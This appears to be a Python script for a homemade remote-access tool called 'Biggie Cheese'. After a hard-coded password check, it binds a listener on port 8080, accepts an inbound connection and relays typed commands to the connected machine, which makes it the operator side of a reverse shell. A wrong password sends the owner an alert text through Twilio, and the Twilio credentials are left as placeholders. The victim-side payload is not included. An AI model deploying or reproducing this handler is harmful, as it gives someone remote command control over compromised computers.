import socket
import sys
from twilio.rest import Client
print('______ _             _        _____ _                         ')
print('| ___ (_)           (_)      /  __ \ |                        ')
print('| |_/ /_  __ _  __ _ _  ___  | /  \/ |__   ___  ___  ___  ___ ')
print('| ___ \ |/ _` |/ _` | |/ _ \ | |   | _ \ / _ \/ _ \/ __|/ _ \ ')
print('| |_/ / | (_| | (_| | |  __/ | \__/\ | | |  __/  __/\__ \  __/')
print('\____/|_|\__, |\__, |_|\___|  \____/_| |_|\___|\___||___/\___|')
print('          __/ | __/ |                                         ')
print('         |___/ |___/                                          ')


def notifyMe():
    client = Client("twilio api key", "twilio api key")
    client.messages.create(to="+your number",
                        from_="+twilio number",
                        body="Biggie Cheese is being accessed by someone")


def start(passwd):
    if passwd == 'default':
        main(input('Enter listening IP:>'))

    if passwd != 'default':
        notifyMe()
        exit()

def send():
    command = input(':>')
    conn.send(command.encode())
    rx = conn.recv(1024)
    rx = rx.decode()
    print('>', rx)
    
def main(ip):
    global conn
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serv.bind((ip, 8080))
    serv.listen()
    print('Listening')
    while True:
        conn, addr = serv.accept()
        from_client = ''
        with conn:
            print('Connection Established')
            print('Session Created with' , addr)
            print("Session Opened")
            while True:
                send()

start(input('Greetings! Enter the password:>'))
